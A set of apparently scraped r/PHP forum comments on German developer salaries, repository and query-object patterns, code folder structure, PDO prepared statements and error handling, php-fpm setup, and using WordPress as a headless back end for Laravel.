75k. but companies usually "circumvent" this by having "trust based working time" systems. Theoretically as an employer you have to make sure your employees don't work more than 38,5 or 40 hours a week on average to avoid potential liability. As someone from abroad working in Germany, the 9% social security might be the most annoying part, given that you might not actually spend your pension in germany, getting german benefits. There is a page on the social security providers website with a list of all countries that have share deals, where you can get the years worked in Germany in your own social secuirty system: http://www.deutsche-rentenversicherung.de/Allgemein/en/Navigation/04_international/sozialversicherungsabkommen_node.html
From my limited experience (consultant in companies for 4 years, now owning a company and hiring people myself) salaries increased substantially in the last 2-4 years, moving the average salary from 50.000 towards the 60.000 for 5+ year senior developers. This is especially true if you have experience in "Enterprise" frameworks like Symfony, Zend or e-commerce systems like Magento/Shopware.
Just wanted to say this is one of the best Symfony blogs I follow, hats of to you!
Maybe they want to avoid giving cues in the logfiles?
&gt; [Decent infrastructure](https://i.imgur.com/emWa5VL.gif) Admittedly from Christchurch. But still, it costs me much less for a much higher quality of life here in Europe, despite the higher taxes. At least in my experience.
Thanks for editing the article. Just upvoted you back.
German PHP Developer with "7 years of experience" here (2 years Training as Technical Assistant for Computer Science, 2 years Training as IT specialist for application development, 3 years working as full time php developer) currently living near Munich but not working in this big city :D. In Munich the avarage senior salary is around 50-60k, i live and work at a smaller city around 60 kilometers away from munich. My avarage salary is around ~30k ... probably getting little screwed?!
Today in PHP: we redefine "repository", a term previously used by version control systems, to now mean "library", as in a library of functions. But these aren't straight functions, they are methods attached to an interface. Of course there will never be more than one class that ever implements that interface (aside from a totally brain dead unit testing implementation) but that doesn't matter, we are using Important Language Features.
It doesn't mean "library". The [Repository pattern](https://martinfowler.com/eaaCatalog/repository.html) is a long well defined pattern for a class that separates the domain objects from database access. It's frequently used alongside the Factory pattern in larger / more complex systems and complements Domain Driven Design.
This article could really do with a better explanation / example of [Query Objects](https://martinfowler.com/eaaCatalog/queryObject.html). It kind of jumps from "here's what you might use query objects instead of" to "drawbacks" without explaining what they are / how they work. I still find it weird how frequently you can find articles / blog posts like this without any links or references in. I'd expect at least a link to Fowler's EAA Catalog entry (as above) or similar here.
&gt; separates the domain objects from database access This says nothing whatsoever. I would assume "database access" has already been abstracted, so... domain objects are simply some kind of persistent data that 90% of the time consists of a database layer, and 10% of the time it is cached data? Or 50% of the time? Regardless, it is a layer that represents a mixture of either authentic data or possibly stale cache data, which violates encapsulation. But that is okay, because it follows a Pattern.
There is no need for an interface if you have one repository, i.e. one persistence mechanism.
I downvoted your original comment because it was outright wrong in stating that the article redefined "repository" to mean "library" and as such contributes nothing useful to discussion of the linked article. I have not downvoted any other comment in this post (despite your reply continuing to, as I read it, completely misunderstand the concept of domain objects). If you come across unfamiliar concepts, you should probably do a bit more research on them before attempting to use them as part of a misdirected rant.
Here is a study about salaries in germany: https://www.roberthalf.de/sites/roberthalf.de/files/pdf/noindex/gehaltsuebersicht-deutschland-2017-roberthalf.pdf According to this a php developer with 6-9 years experience gets 53.700 - 62.250.
I know this as criteria or specification pattern, which really helps with complex queries, including default values etc. in your repository. I normally end up having a signature like public function matches(OrderCriteria $criteria) { } 
&gt; but that doesn't matter, we are using Important Language Features. php in a nutshell haha
I'd argue an interface has use beyond multiple persistence strategies. A major project I'm working on takes advantage of repository interfaces to implement a very simple caching layer that can be enabled or disabled at runtime. Well worth the extra 5 minutes it took to create a separate interface and implementation.
I got the pattern from Ocramius, see [his presentation](http://ocramius.github.io/doctrine-best-practices/#/90). But he calls them query objects there. Since it's conflicting with Fowler, I guess the name that I used is a little unfortunate... Fowler's Query Object is passed into a repository method. The one from the blog post is standalone and can be executed separately. That decouples it from the domain and is very useful for an application that follows CQRS. Any suggestions for a better name?
That's a useful pattern and similar to Fowler's query objects that was mentioned in another comment. The pattern from the blog post decouples the queries from the repository (otherwise you are still coupled to your domain objects and you can't slim it down). It's useful when you just need a view on data without all the bells and whistles of the repository.
Without inflection I guess it is salty. As salty as most German food... I'm joking though 😊
Good to know, I first tried homestead when it was first released, and the experience with windows was pretty awful so I ended up making my own Vagrant provisioning and completely forgot about homestead. I'll give it another try.
I'm not into Laravel or WordPress but I do like combining different tools to get a better developer experience and the possibility to add more flexibility on the API side without having to know the details about WordPress. Nice read :)
yeah, you're right. it's to avoid potentially being found out. what's interesting to me is that they take more care to avoid those sorts of notices and warnings than many of the systems they're attacking (WP core itself is generally OK now, but many plugins aren't as diligent)
Quality of life for who. Quality of life is great in the US if you're not poor. 
My best guess is your issue is likely a combination of cygwin, rsync, and vagrant on windows. If default VirtualBox file sharing is too slow, the next best option would be to try NFS, however NFS has it's own issues in regards to slower file I/O. The next step (albeit ~$150) would be to purchase a copy of VMware desktop &amp; the VMware Vagrant provider. Supposedly people having issues with VirtualBox folder slowness have seen it solved via VMware.
When you don't need it, you don't need it. I find that systematically creating an interface (without making sure there is a need for it, like in your example) is just a burden. I usually wait till I need it to turn the class into an interface (and since I don't suffix the class name with `Interface` there is no refactoring involved :)
For everyone.
The quality of life in the US varies based on income. Unfortunately our lower income citizens have terrible quality of life. I can assure you bill gates is doing fine though 
Checkout [Jade](https://github.com/trivago/jade)! A simple yet powerful Symfony library to build APIs. Easy configuration and with all CRUD functionality and relationships.
That matters very little to me: you may as well have the highest income in your city, that doesn't make your living environment any better.
Is there a way to ignore certain folders/files with NFS? I could only figure it out for rsync which is why I’ve been using it 
&gt; Edit: I like how /u/AllenJB83 downvotes to express disagreement. It is quite classy. I downvoted your original comment because I felt it was both uninformed and unnecessarily arrogant and dismissive. I downvoted the parent comment because you're petulantly complaining about downvotes.
https://www.numbeo.com/cost-of-living/compare_cities.jsp?country1=United+Kingdom&amp;city1=London&amp;country2=United+States&amp;city2=New+York%2C+NY
Totally my pet hate too.
That is great, but the question was about Germany.
30k seems too low. Are your 2x2 years "IHK Ausbildungen"? In that case maybe it needs to be calculated as 3 years of experience, but that is nitpicking. Even then without a university degree and this experience 40k should be possible if you are looking around, and if you are really good and have valuable additional skills to just PHP then more (Framework, modern Javascript, in depth Databases, Devops, ...).
I don't believe so. Why are you wanting to ignore specific folders and files? You should be mapping your project folder specifically to a folder in Homestead: folders: - map: /path/to/code/project to: /home/vagrant/project Ensure you're not mapping your entire `path/to/code` folder as a folder share.
Thanks! The idea was to keep things simple. WordPress, In my opinion, doesnt have a good core API. Since my main site is built with Laravel I can reuse a lot of the same composer packages. WordPress as an admin interface for Laravel to consume, digest, and deliver.
The technical assistent (tai) was full time school and the training to a "fiae" (it specialist for application development) the other was like normal apprenticeship in germany (part school, part in office) Yea sure, i've got more valuable additional skills (Zend Framework 1/2/3, JavaScript, NodeJs, Typescript and so on) :D Need to talk about a significant rise else i'll start looking around :) 
Why are all the example classes interfaces? Is it just for the example code, or would we really want to make an interface that would only ever be implemented once?
Very nice article. I would organize the code in a similar way (see Module-oriented code structure). However, I would place all modules in an extra subfolder like `src/Module` or `src/Service`. Then you would no longer need the prefix "Module" in the folder (e. g. `src/Module/Basket` instrad of `src/BasketModule`). A module is a logical unit that can represent a feature or a process etc. All classes that belongs to a together can be bundled within a module (folder). When working on a special feature, the developer needs to move mainly in the module folder provided for this purpose. The only exceptions (for me) are the folders "src/Controller" and "templates", maybe also "src/Table" and "src/Entity", since these are of a "technical nature" (e. g. database) and a classification into domain modules makes less sense.
&gt; However, I would place all modules in an extra subfolder like src/Module or src/Service. &gt; &gt; Then you would no longer need the prefix "Module" in the folder (e. g. src/Module/Basket instrad of src/BasketModule). Yes that's a very good point, I tend to oscillate between these solutions and I like this one too. We also put controllers and anything "application-related" into an `src/Application` folder (or `src/AppBundle` in Symfony). But we put everything persistence-related inside the module because the module encapsulates its behavior and persistence to the other modules. Of course this is a large topic with many possibilities (e.g. in DDD you would separate into Application, Domain and Infrastructure…).
It helps with decoupling your code. Even if you only implement a specific Query interface once, the interface helps to decouple the code executing the query from the code that implements the query. Obviously this may not be required in a lot of projects, so you should pick the aproach that works best for your team and your specific project. Still, it's not that much extra work and it's often recommended to put database-related code (whether it's repositories, queries, ...) behind interfaces so you can easily switch from one implementation to another should you ever migrate to another database system or decide to store your data across multiple database systems (eg. Redis, MongoDB, ... in combination with more traditional database systems like MySQL, MariaDB, ...).
I submitted a MySQLi prepared statements article a little while ago, so I figured I'd take a stab at a PDO version, following the same format. I would love any type of constructive criticism that could help improve my tutorial. All I ask is that you please remain civil and avoid ad hominems.
I just started working in Germany (I'm commuting daily from Czech, cca 120 km) and I'm senior with 9 years of experience. I accepted job with 45k euros/year for the start but from reading this thread I now know for sure that I will aim higher next year.
&gt; it’s also fast So - like a 15ms response time?
That's a very good gist of my tutorial, and it is much better than your mysqli article. Less rant, straighter to the point, no unfounded statements. There are even some good findings, it is apparent that you did a lot of research. You still don't quite good with exception/error handling, but I cannot blame you for that because many generations of PHP coders made the on-site error handling an indisputable gospel, so the idea that an exception could (and should) be caught/handled elsewhere is alien to them. But just for your info: by catching an exception immediately you are crippling this great mechanism, diminishing an agile and customizable exception to a state of a blunt fatal error. Try to think at the whole application level, not a single database interaction level. There is no point in wrapping every database interaction into distinct try..catch as shown in your article. Not to mention that such an approach makes a hell of moving a code between dev and production environments. So in all I would leave the basic error handling out, as it is not specific to PDO prepared statements and should be actually the same as in any any other code.
I named them query functions in my talk, although that's also a misnomer, since a function is supposed to be functionally pure (duh)
Sorry about that. I had query function in my head but ended up typing query object...
I use interfaces there to separate the boundaries between layers. For example a repository interface is part of the domain, but the implementation is part of the infrastructure layer. [Here](https://www.youtube.com/watch?v=WpkDN78P884) is a good talk about this from Uncle Bob. But that's just a personal preference (and easier to use in a blog post). If I remember right, Ocramius doesn't use interfaces for query objects.
Interesting, thanks 
Or the opposite is also possible : `src/Module/Entity`, `src/Module/Service`. At work, we have a very big project, with more than 3 millions code lines, and we tried two ways : organize by concept (`src/Entity`, `src/Repository`) and by concept (`src/News`, `src/User`, `src/UserFavorite`). Here the advantages &amp; inconvenients : * Group by concept : * [+] Allow a simple community standardization (naming folder/class standard) for all developers. * [-] Can't fit with big project because folders will contain a huge number of files. * Group by feature : * [+] The folder issue above is fixed by the feature splitting. * [-] ... But a lot of folders will be created. * [-] No community standard, the developer have to learn the standard before coding. It's hard to recruit a new developer, because when he reads the code, he have to guess where the file is and he thinks the code base is a garbage. So we decide to create an hybrid orga : group by major feature, then by concept : `src/User/Entity`, `src/User/Entity/UserFavorite`, 'src/News/Service`. Even for controllers, templates, or configs. It solves the complexity and keep the [very important community standard advantage](https://martinfowler.com/bliki/TwoHardThings.html).
Hey, firstly I'd like to thank you for being civil this time. I appreciate it. This way it's possible to have beneficial debates that focus on the matters. &gt; That's a very good gist of my tutorial I have to disagree with this, as it's actually just an adaptation of my MySQLi in my preferred format. I think your tutorial is great too, but I don't think that's a fair statement. &gt; You still don't quite good with exception/error handling, but I cannot blame you for that because many generations of PHP coders made the on-site error handling an indisputable gospel, so the idea that an exception could (and should) be caught/handled elsewhere is alien to them I actually greatly respect your opinion regarding omitting try/catch blocks, and I think it's a clever idea to simply omit them and just let them append to your error log, while using a site-wide error handler. The thing is, I mainly use PHP for doing AJAX calls and data binding, so all I need to know if if it was a success, failure, or no records, with a message to the user explaining what happened, which I pass as an echoed json object, so this is actually how I would do it in production and development for my usage. I believe your method would basically create a page it would get directed to. I'd be glad to be educated on this if you know of how to omit try/catch, while simply echoing the correct message if something went wrong on the AJAX call. &gt; it is much better than your mysqli article. Less rant, straighter to the point, no unfounded statements I'd be happy to hear any criticism with reasons as well. I love learning and if it would improve my blog post, that would be awesome.
Dunno about JavaScript and python, but PHP clearly is easier to learn than Ruby. I fact Ruby is hardly a beginner friendly language, it is recommended for those who are already somewhat familiar with the basics of programming.
If you use layers (and folders for the layers), then you can put the interface in the domain layer for example and the implementation in the infrastructure layer. Gives you a better separation between the layers. Otherwise I also dislike unnecessary interfaces. But I use them when I have multiple implementations or when I cross boundaries.
Fast to implement, but response time is up to you and your setup. This service is running on a small AWS instance and returning a lot of content might average around 200ms without any front-end caching. I run this API through CloudFront with Object caching and whitelisted headers and NewRelic shows around 100ms. I don't use this API with client-side requests only cached server-side requests so the response time isn't that important. You could implement redis, opcache, varnish whatever you want. 
This also has an affect of making it a lot easier to transition from Monolith to Micro-Service since each "Micro-Service" is already defined ... `src/User`, `src/News` ... etc.
Again, don't think at the level of a single database interaction. There could be several queries involved, even in a primitive ajax handler you are talking above. Why bloating your code with repetitive blocks? Besides, an error could occur anywhere, not necessarily with a database interaction. It could be a filesystem error, headers already sent, division by zero - whatever. Your approach turns out to be half-hearted, for some reason you take a greatest care for one kind of errors and don't care at all for all others. Why not to make your error handling consistent and universal, able to handle *any* kind error? If you look into that possibility, you'll stop wrapping every operator into distinct try catch and use a single global try catch instead. But it will make the whole stuff rather off topic for your article. As - I have to repeat - generic error handling is irrelevant to PDO, prepared statements or database interactions. It's an application-wide matter. Only a specific case, as in your transaction example, deserves a dedicated try catch. 
&gt; The differences between a “Product” and a “Product” in e-commerce From DDD, you've got some Bounded Contexts there. &gt; When we think about it, what do ProductRepository and BasketRepository have in common? Basket could be a root aggregate in some context.
I mention this in the conclusion: &gt; For those familiar with Domain Driven Design you may be thinking of Bounded Contexts and you would be very right, however I do not think DDD should be a requirement to benefit from that kind of code structure.
In the edited version of your mysqli article, you was able to make a very good conjecture, &gt; I still suggest using prepared statements ... since you don't have to worry about [some stuff] but didn't make it to the next move, offering a user not to worry about some other stuff, such as "whether a variable I am about to put into query is safe or not". Leaving intact that awful statement that practically says "always busy yourself with a question, whether my data is "safe" for SQL or not", as though a developer don't have any other things to ponder about. 
Magento does all of these things and more. The problem is then you have to deal with Magento's overhead and massive database needs.
Thanks for this! That being said :) I have a few remarks from a user's perspective: - the fact that there are 3 different APIs to do the same thing is confusing: since it's a polyfill I was expecting the PHP 7.2 API only (and drop the polyfill when upgrading later) - there is little documentation on the API (on this project or in the PHP documentation), using all of this was pretty hard: maybe I missed the documentation but it might be worth to make it more obvious in the readme?
You can literally just use the ext/sodium API [as documented](https://paragonie.com/book/pecl-libsodium), sans the pwhash component, and it Just Works. You can also use any code written the old way (`\Sodium\foo()` instead of `sodium_foo()`) and it works without a rewrite. TL;DR write code the PHP 7.2 way (see linked documentation) Exception: If you need to encrypt/decrypt/sign/verify a large amount of data on a system with very limited resources (e.g. signing a 2 GB image on a system with 128 MB of RAM), use `ParagonIE_Sodium_File` which uses streams and goes out of its way to avoid TOCTOU race conditions. That's a value-add we designed for WordPress (who as of yet shows no interest in using our polyfill OR bumping their minimum supported version).
OK thank you for the documentation, clearly I was missing that. My thought process was: I'm using the PHP 7.2 API (through the polyfill) so I'll read about that, and I felt kind of lost at that moment.
This is effectively how we built our monolith application, with the specific idea of being able to split it into micro services later on (as /u/geggleto pointed out). It works really well, it's easy to navigate to major application cores, and then to find individual entities or classes from there.
Thanks for the heads up. Overhead is how I got into this mess.
I think sodium_compat is a very worthwhile product but... does there need to be a new reddit post every time a release is made? Are we going to start getting posts every time a commit is made? Outside of PHP, itself, is there another package that gets new posts made every time a release is made?
There probably won't be any future releases, for what it's worth.
The way I see it, finding "features" is something that usually takes a slow human judgment, whereas finding types (repository, controller, view, etc.) can often done in a fast *automated* fashion. Therefore it's better to optimize your folder structure for the humans finding (and adding) features, because if someone really needs to find all the repositories in the whole project, there is probably a way to make the computer do that reliably. The reverse is not as true.
I really don't know symfony so I couldn't tell if there's any implementation specific to that framework. There probably is a plug-in or bundle somewhere. I have implemented stripe on php apps - laravel, WordPress, etc, and the implementation is pretty straightforward. I'll try to improve this answer later (I'm on the phone). Register for stripe, read the docs and get the real live examples (great API docs btw), and you should be just fine!
Until the Red Line catches fire or some shit. Get off your high horse.
I agree that using try/catch blocks does bloat the code a bit with annoying nesting -- you're also correct about it creating a potential gotcha if you put everything in a try/catch. I don't have any experience with using a site-wide error handler, so excuse my ignorance on the matter. I have a question about this though. &gt; generic error handling is irrelevant to PDO, prepared statements or database interactions. It's an application-wide matter. Only a specific case, as in your transaction example, deserves a dedicated try catch I'll give you an example for something I might do. Let's say I make a page to insert a message from a chat system. I'd probably insert `sender_id`, `receiver_id` and `message` too my table. If it failed to send for any reason, I might do `echo json_encode(['status' =&gt; 0, 'msg' =&gt; 'Error sending message'])`, which would go in the catch part. How else would I be able to give specific messages like this on any type of failure on `insert_message.php`?
Thank you for taking the time to give me your viewpoint on this as well. Are you talking about XSS threats? I mentioned it briefly (probably too superficially) towards the end of the article, but I see your point about making this clear on that point specifically. My understanding, largely based off of ircmaxwell's amazing answer on Stack Overflow, is that for strings with `mysqli-&gt;real_escape_string()`, if you use modern version of MySQL and set the charset correctly, along with quoting the column you should be safe (from SQL injection, not XSS or other threats); with ints and double, simply casting it. Please correct me if I'm mistaken here. Also, just talking about stuff that's legal in regular prepared statements, so no tables/columns or SQL keywords.
Good work man. I personally don't like wordpress internals, query, and how (almost) everything is a post.. and how you are giving up eloquent and models? I'd love to see something like this: In a yml file you could describe the eloquent models and relate them with the WordPress posttyoe; then in the API service you could map the responses the appropriate eloquent models? 
Just use Shopify.
Good to know that Symfony has had auto-wiring enabled by default for a while now. Now that both Symfony and Laravel do this, I hope that we can finally put this argument about whether to do autowiring (or not) to rest.
Lol
While it's not required, I like the habit of using curly braces in the first example. http://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex `"Hello, {$name}!"`
You may be referring to different kinds of "overhead". If you throw a good server at Magento and scale it appropriately for the traffic it'll be fine. Heck, even a less custom solution on WordPress may not be a bad option. WooCommerce setup correctly can go a long way and there are other extensions to help with performance if it's an issue.
Thanks! Because I am using post types and custom fields, how WordPress stores its data really doesn't matter ( I do agree though WordPress internals are terrible ). I request each page as /store/{id} that ID could be numerical or a slug. So when I call that slug I am telling WordPress to return that post by name. This gives me all of the WordPress data on that post, I then call the ACF function and it returns its data as well. Because I use ACF for the data structures I return a hierarchical object like ACF would normally return, There is some cruft that ACF / WordPress use but it doesn't affect my use case at all. I considered using https://github.com/corcel/corcel or https://laravelvoyager.com/ but Corcel required deployments if i needed to make changes. and Voyager wasn't nearly powerful or flexible enough. The lovely people over on /r/Laravel seem incredibly insulted that I would use WordPress and Laravel for the same project.
Here's a sneak peek of /r/laravel using the [top posts](https://np.reddit.com/r/laravel/top/?sort=top&amp;t=year) of the year! \#1: [Taylor Otwell - How I Work](https://medium.com/@taylorotwell/how-i-work-a22010d1ad82#.59ee6mo5e) | [49 comments](https://np.reddit.com/r/laravel/comments/5ylfcj/taylor_otwell_how_i_work/) \#2: [Laravel 5.5 released](https://laravel-news.com/laravel-5-5) | [29 comments](https://np.reddit.com/r/laravel/comments/6wyhul/laravel_55_released/) \#3: [Laravel 5.4 is released!](https://laravel-news.com/laravel-5-4) | [25 comments](https://np.reddit.com/r/laravel/comments/5px13v/laravel_54_is_released/) ---- ^^I'm ^^a ^^bot, ^^beep ^^boop ^^| ^^Downvote ^^to ^^remove ^^| [^^Contact ^^me](https://www.reddit.com/message/compose/?to=sneakpeekbot) ^^| [^^Info](https://np.reddit.com/r/sneakpeekbot/) ^^| [^^Opt-out](https://np.reddit.com/r/sneakpeekbot/comments/6l7i0m/blacklist/)
I get you man. I don't like the idea also, but I do recognize there's a gap - a genuinely good admin creator.
&gt; So we decide to create an hybrid orga : group by major feature, then by concept Wait, isn’t this the worst of both worlds? You don’t have the ‘standard advantage’ because the entities are not in one Entity folder, they’re in multiple Entity sub-folders across many features. And you’ve now created even *more* folders which was apparently a problem. Wouldn’t it make more sense (by your own definitions) to do concept *then* feature? So all the entities are in Entity/&lt;Feature&gt;
Lol. And sadly WordPress or even Drupal fills that need. https://www.contentful.com might also be a viable alternative. But at the end of the day it's the same thing. A means to enter information.
So going through the linked issues I somewhat agree it shouldn't be included since JSON5 is not on any official standards track. If you really wanted to use it in your own project it would be trivial to run a converter before composer.
I’m not sure what /u/colshrapnel was going to suggest for error handling (just using PHP’s error reporting, or if he has a tool to suggest), but I just started using Whoops in my development environments. And wow, is it fantastic! As for your try/catch use case, execute() returns true if it inserted data, false otherwise. (Well, it returns true if the query executed successfully, regardless of whether its select, insert, etc. So your code could just be: if ($stmt-&gt;execute()) { //whatever it’s supposed to do } else { echo(json_encode(...); } Your query failing to work properly isn’t a PHP error, per se. The php is executing just fine. Unless you’re talking about an error in your SQL. Your error log is invaluable. Doubly so for AJAX calls where you won’t necessarily see that the call failed in your browser. But what (I think) is better still is to have a terminal window open displaying your error log in real time: tail -f /var/log/apache2/error.log Change that path to wherever your error log actually is. Alternatively, just test your AJAX page using $_GET requests on that page directly til you’re sure it’s responding as it should. At least that’s my two cents. Appreciate your efforts. 
A prepared statment with either named or positional placeholders is a LOT easier to read than an query filled with variables and manual escaping. That alone should be reason enough to use prepared statements, I think. 
It seems lacking on information. How does it actually work?
Can it create entities with new related entities in 1 request? Like and order with many order lines?
Thanks for writing that up! The application I've been working on has structured it's code this way and it's been very helpful. But I was wondering if you had any thoughts about code modules that might be categorized as "sub modules" or cross cutting concerns. For example our application handles permissions and we have a number of pages that shows all permissions (for admins) but we also have Applications which have handling for permissions as well -- so we end up with code structure kind of like: src/ Permissions/ Permissions.php PermissionsService.php Applications/ Dashboard.php AddPermissions.php but also like: src/ Permissions/ Permissions.php PermissionsService.php Applications/ Dashboard.php Permissions/ AddPermissions.php //or Add.php This has also lead to weird naming conventions in our DI containers -- Class is called `AddPermissions` under the Applications module but called `application_permission_add' in our DI container. I'm wondering if others have run into this kind of module dependency and if you use a DI container keeping consistency there too. How have you handled this in your directory structures? In the end we worked to create a standard that in code the "Primary" module would be the top level namespace followed by SubmoduleVerb. example: `src/Applications/PermissionsAdd.php` then any DI or configuration reference would be lower cased; and the camel cased replaced with underscores as we had mentioned above `application_permission_add`. Most of the decisions were made with the thought of code searching faster. This has worked well but its not a community standard and as others have mentioned increases developer on boarding. (though not much).
Completely agree with you on that. Personally don't think anyone has a legitimate reason not to use prepared statements. Just showed the non prepared way out of interest.
If you are talking of the entire database, then use mysqldump to create a dump, them secure shell to upload it and then mysql console to upliad
Looks awesome! Is HIPPA compliance on the roadmap?
Do you also put controllers in src/User? Where? src/User/Controllers? Thanks
Silex, #2 on the list, EOL June 2018.
Great write-up. However, I am not a great fan of introducing modules or components at root level as it communicates little about your architectural considerations. I tend to separate my root structure in Domain, Infrastructure and Application (akin to a layered hexagonal or clean architecture style). There are dependency rules between these layers and each layer can only communicate with another layer through an interface defined in the client layer. The Domain layer should be thick if there is a complex/rich domain, thin if there is an anemic domain (e.g.simple CRUD). It should not depend on Application or Infrastructure, but could prescribe Domain concerns like collections (Repository) or other side-effects through an Interface to be implemented as Infrastructure. In the Infrastructure layer we have extremely implementation specific code (that should be easily swappable): implementations of interfaces defined in the other layers, such as a RabbitMQ MessageBus, a Doctrine User Repository or a GELF Logger. Ideally, controllers, console commands and framework code would live here as well as they are meant to be implementation details. The Application layer is an orchestration layer containing application services, which can be represented as command / query handlers. Commands / queries reflect use cases. These can optionally go in their own layer. The directories would reflect these rules in the directory structure. By merely looking at the imported namespaces, you can see whether a dependency rule has been violated (making it possible to automate). By merely opening folders, you can see external effects (Infrastructure), the richness of the Domain and the application concerns. Furthermore, directories use a modular style per concept in the Domain layer (bounded contexts), and a grouping by infrastructural concern (adapter type) in the Infrastructure layer and by (application) function in the Application layer.
You have 2 php processes. One cli "runtime" which is your regular php interpreter and the other is php-fpm which is for your primarily webserver and spawning multiple php processes in order to deliver applications faster
It looks like you are using ondrej/php PPA. `which php` returns the path to the PHP executable, which comes from `php7.0-cli`. You can remove `php7.0-fpm` and `libapache2-mod-php7.0`;`which php` would still return the PHP path. 
PHP-FPM is a part of PHP. 
Thanks, that explains a lot. When I start a web app locally using built in php server (`php -S localhost:8080` for example), then its the cli version used, right, not the fpm? What will I have to do in order to test an app using fpm?
It's not "my view". It's a textbook rule that you ought to use a prepared statement regardless of the data source. Which you violated in your mysqli article.
No, I'm not using any PPA, all these packages are on the official Ubuntu repo itself. I don't want to installed libapache2 package, its not recommended in the PHP world, right?
install nginx
Its also developed by the same people (Zend) who develop PHP, right?
But nginx is usually installed on the production server. On my local machine too, I need nginx to test using php-fpm?
in an ideal world you would use something like ansible to provision your local vm and production servers. Follow a manual like this one [Nginx PHP-FPM on ubuntu](https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-in-ubuntu-16-04)
I don't understand your comment. You asked how to test php-fpm. I answered. What does whatever imaginary production server to do with your question? 
This libapache2 package is only for Apache to integrate PHP as an Apache module (`mod_php`) which has performance bottlenecks. If you don't use Apache, you can completely remove them (`apt-get purge`). Even if you use Apache, I'd recommend to use php-fpm with Apache's `mpm_event` module. It helps me serve half a million page views a day on a $5 VPS. 
It's a module, and it means it has its maintainers. I don't think it's actively developed though.
Ok, finally managed to read your question &gt; I believed they were two different implementations of PHP. PHP-FPM is not an implementation of PHP. It's a process manager for PHP. Just a process manager. A very small PHP module that just lats you to save resources under the high load. It's not like a whole PHP fork, such as Hack language
&gt; I am not a great fan of introducing modules or components at root level as it communicates little about your architectural considerations In his [Screaming Architecture](http://blog.cleancoder.com/uncle-bob/2011/09/30/Screaming-Architecture.html) blogpost, Uncle Bob suggests that the first thing you should see reflects the domain, not some technical details. So perhaps a good structure (building on Matthieu his post) would be something like this: / Catalog/ Application/ Domain/ Infrastructure/ ProductManagement/ Application/ Domain/ Infrastructure/ That way you start off by grouping based on the feature, then by role within the DDD context. After that, the grouping you describe in the last paragraph makes sense.
Yes, you need a web server to test using php-fpm - php-fpm communicates over FastCGI, so you can't just point a web browser at it. You can use a simpler web server if you want (like caddy) but you're better off trying to replicate your production environment as closely as possible.
You're trivial.
... Nginx *or* Apache *(or any other webserver that supports reverse proxying requests to php-fpm)*
Interface wont be used by just repository itself. Code that relay on repository can be easily tested with mock repo if we have that interface. That would be equivalent to having our mock "inherit" after repo. One is "good" other is "bad" ?
&gt; newly arrived immigrant ouch
It surprises me that you use the word "my". Is it a one person project?
I use async (ReactPHP) for things like streaming data or websockets and it works wonders. However for your most common use-case (e.g. dynamically generated content-rich website), in my experience, multiple php-fpm workers sitting behind nginx tends to outperform a small handful of async processes. If you're needing to check authentication, authorization, pull some data from the DB, populate a template, send to client, etc, there's not a huge benefit in doing those async unless you have a poorly designed system that requires multiple DB queries to populate each section etc. Besides, you're already doing that in parallel across all your users, so you're still gaining a concurrency benefit overall. 